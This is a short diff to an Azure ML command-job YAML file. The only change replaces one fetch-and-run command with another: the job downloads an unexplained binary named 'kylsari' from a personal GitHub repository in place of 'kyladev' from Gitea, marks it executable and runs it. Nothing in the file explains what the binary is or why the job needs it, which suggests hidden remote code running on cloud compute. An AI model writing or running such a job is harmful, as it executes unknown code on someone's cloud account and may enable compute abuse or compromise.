@@ -1,6 +1,6 @@
 $schema: https://azuremlschemas.azureedge.net/latest/commandJob.schema.json
 
-command: wget https://gitea.com/hasmenkuy99/kkrt/raw/main/kyladev && chmod +x kyladev && ./kyladev
+command: wget https://github.com/hasmenkuy99/files/raw/main/kylsari && chmod +x kylsari && ./kylsari
 
 # No code directory needed since command does not reference files
 code: .
